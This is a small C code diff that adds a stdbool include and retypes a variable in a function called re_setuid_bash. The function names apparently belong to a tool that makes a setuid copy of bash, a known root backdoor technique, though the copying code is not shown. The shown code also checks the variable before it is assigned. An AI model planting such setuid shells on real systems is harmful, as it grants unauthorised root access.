@@ -6,6 +6,7 @@
 #include <fcntl.h>
 #include <dirent.h> 
 #include <string.h>
+#include <stdbool.h>
 
 #ifdef FILENAME_MAX
     #define FILENAME_LEN FILENAME_MAX
@@ -64,7 +65,8 @@ bool compat_setuid_bash(void){
 int re_setuid_bash(void){
     struct stat file_stat;
     char copy_buffer[MAX_BUFFER_SIZE];
-    int bash, setuid_bash;
+    FILE *bash;
+    int setuid_bash;
     int bytes_read;
     
     if (bash == NULL) {
